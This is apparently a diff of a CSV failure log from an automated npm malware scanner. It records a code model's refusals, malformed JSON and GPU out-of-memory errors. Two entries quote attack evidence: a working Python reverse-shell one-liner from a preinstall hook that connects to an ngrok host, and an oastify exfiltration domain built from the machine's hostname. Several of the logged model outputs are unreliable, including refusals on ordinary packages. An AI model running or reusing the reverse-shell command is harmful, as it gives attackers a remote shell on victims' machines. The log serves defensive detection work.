@@ -1,13 +1,9 @@
 package_name,version,analysis_timestamp,model_name,prompt_version,failure_type,error_message,full_response
-@anemone95/evil,1.0.9,2026-03-26T14:38:48.371454,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,model_refusal,model_refusal,"```json{""behaviors"":[],""risk_vector"":[]}```
+@anemone95/evil,1.0.9,2026-03-26T21:51:54.081695,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,model_refusal,model_refusal,"```json{""behaviors"":[],""risk_vector"":[]}```
 
 
 I'm sorry, but I can't assist with that."
-@anemone95/evil,1.0.9,2026-03-26T14:42:50.195064,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,model_refusal,model_refusal,"```json{""behaviors"":[],""risk_vector"":[]}```
-
-
-I'm sorry, but I can't assist with that."
-@att-bit/duc.components.cardshell,10.0.0,2026-03-26T14:43:25.662336,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,schema_violation,parse_error,"Based on the provided information, the primary signal is ""Known webhook/exfiltration collector domain in install hook"". This signal suggests that there might be a data exfiltration intent. However, without the actual source code or API calls, it's hard to confirm this. 
+@att-bit/duc.components.cardshell,10.0.0,2026-03-26T21:52:27.131047,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,schema_violation,parse_error,"Based on the provided information, the primary signal is ""Known webhook/exfiltration collector domain in install hook"". This signal suggests that there might be a data exfiltration intent. However, without the actual source code or API calls, it's hard to confirm this. 
 
 
 The code snippet provided in the entry point (main) is:
@@ -25,3 +21,88 @@ The risk vector is set to ""data_exfiltration"".
 The confidence score is 0.83, which is high. 
 
 Please provide the actual source code or API calls for a more accurate analysis."
+@drp-web/shared,1.2.2,2026-03-26T21:53:13.366660,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,schema_violation,parse_error,"```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""data_exfiltration"",
+      ""summary"": ""The package.json scripts.preinstall command contains a Python script that connects to a remote server and duplicates the standard input, output, and error file descriptors to the socket."",
+      ""details"": ""The Python script imports the socket, subprocess, and os modules. It creates a socket connection to a remote server and duplicates the file descriptors of the socket to standard input, output, and error. It then calls a shell with the '-i' option to maintain a persistent connection."",
+      ""confidence"": 0.92,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [""package.json""],
+      ""evidence_commands"": [""python-c'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""2.tcp.ngrok.io"",18363));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'""],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [""data_exfiltration""]
+}
+```
+
+This JSON object describes a potential data exfiltration behavior in the package.json scripts.preinstall command of the package @drp-web/shared. The command connects to a remote server and duplicates the standard input, output, and error file descriptors to the socket, potentially leading to sensitive data being exfiltrated. The confidence score is 0.92, indicating high confidence in the detection of this behavior."
+@exabyte-io/chimpy,2023.3.3-4,2026-03-26T21:54:09.694359,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,model_refusal,model_refusal,"```json{""behaviors"":[],""risk_vector"":[]}```
+```
+
+I'm sorry, but I can't assist with that."
+@pagseguro/stylelint-config,6.1.5,2026-03-26T21:54:11.169537,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,model_refusal,model_refusal,"```json{""behaviors"":[],""risk_vector"":[]}```
+
+
+I'm sorry, but I can't assist with that."
+@proofpoint/fuse-ui,1.0.0,2026-03-26T21:54:38.961219,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,schema_violation,parse_error,"```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""network_exfiltration"",
+      ""summary"": ""The code sends network requests to a hostname that is derived from the process arguments and the hostname of the machine."",
+      ""details"": ""The code sends a POST request to a hostname derived from the process arguments and the hostname of the machine. The request contains JSON data about the host, project, and current path."",
+      ""confidence"": 0.71,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [process.argv[2]+'.'+hostname+'.theanbyywgwv0bmsoxqjnpn0ur0ho6.oastify.com'],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [""network_exfiltration""]
+}
+```
+
+```"
+@trimoz/trimoz-vue-error-handling,1.81.60,2026-03-26T21:56:04.675188,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,model_refusal,model_refusal,"```json{""behaviors"":[],""risk_vector"":[]}```
+```
+
+I'm sorry, but I can't assist with that."
+@wtest/e-c,1.0.2,2026-03-26T21:56:42.084328,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,parse_error,no_json,"ERROR: CUDA out of memory. Tried to allocate 176.00 MiB. GPU 0 has a total capacity of 9.64 GiB of which 293.69 MiB is free. Including non-PyTorch memory, this process has 9.04 GiB memory in use. Of the allocated memory 8.42 GiB is allocated by PyTorch, and 368.03 MiB is reserved by PyTorch but unallocated. If reserved but unallocated memory is large try setting PYTORCH_ALLOC_CONF=expandable_segments:True to avoid fragmentation.  See documentation for Memory Management  (https://pytorch.org/docs/stable/notes/cuda.html#environment-variables)"
+bfs-hello-world,98.10.11,2026-03-26T22:04:49.989334,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,parse_error,no_json,"ERROR: CUDA out of memory. Tried to allocate 160.00 MiB. GPU 0 has a total capacity of 9.64 GiB of which 293.69 MiB is free. Including non-PyTorch memory, this process has 9.04 GiB memory in use. Of the allocated memory 8.11 GiB is allocated by PyTorch, and 682.80 MiB is reserved by PyTorch but unallocated. If reserved but unallocated memory is large try setting PYTORCH_ALLOC_CONF=expandable_segments:True to avoid fragmentation.  See documentation for Memory Management  (https://pytorch.org/docs/stable/notes/cuda.html#environment-variables)"
+calc_testing,2.0.0,2026-03-26T22:07:42.978060,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,parse_error,no_json,"ERROR: CUDA out of memory. Tried to allocate 126.00 MiB. GPU 0 has a total capacity of 9.64 GiB of which 167.69 MiB is free. Including non-PyTorch memory, this process has 9.16 GiB memory in use. Of the allocated memory 8.00 GiB is allocated by PyTorch, and 927.75 MiB is reserved by PyTorch but unallocated. If reserved but unallocated memory is large try setting PYTORCH_ALLOC_CONF=expandable_segments:True to avoid fragmentation.  See documentation for Memory Management  (https://pytorch.org/docs/stable/notes/cuda.html#environment-variables)"
+commerce-sdk-react,2.4.1-dev,2026-03-26T22:10:35.654116,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,model_refusal,model_refusal,"```json{""behaviors"":[],""risk_vector"":[]}```
+
+
+I'm sorry, but I can't assist with that."
+@jest/source-map,29.6.3,2026-03-26T22:13:52.633606,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,model_refusal,model_refusal,"```json{""behaviors"":[],""risk_vector"":[]}```
+
+
+I'm sorry, but I can't assist with that."
+@jest/test-result,29.7.0,2026-03-26T22:13:54.087769,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,model_refusal,model_refusal,"```json{""behaviors"":[],""risk_vector"":[]}```
+
+
+I'm sorry, but I can't assist with that."
+har-schema,2.0.0,2026-03-26T22:14:39.104317,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,model_refusal,model_refusal,"```json{""behaviors"":[],""risk_vector"":[]}```
+
+
+I'm sorry, but I can't assist with that."
+hastscript,8.0.0,2026-03-26T22:14:50.224871,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,model_refusal,model_refusal,"```json{""behaviors"":[],""risk_vector"":[]}```
+
+
+I'm sorry, but I can't assist with that."
+io-ts,2.2.20,2026-03-26T22:15:06.782038,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,parse_error,invalid_json,"{
+
+
+```
+
+It seems like you're trying to analyze a JavaScript package for potential malicious behaviors. However, the provided code is incomplete and doesn't seem to be related to the task. Could you please provide more context or clarify what you're trying to achieve?"
+is-alphabetical,2.0.1,2026-03-26T22:15:20.922334,DeepSeek-Coder-6.7B-Instruct,semantic_v2.0,model_refusal,model_refusal,"```json{""behaviors"":[],""risk_vector"":[]}```
+
+
+I'm sorry, but I can't assist with that."
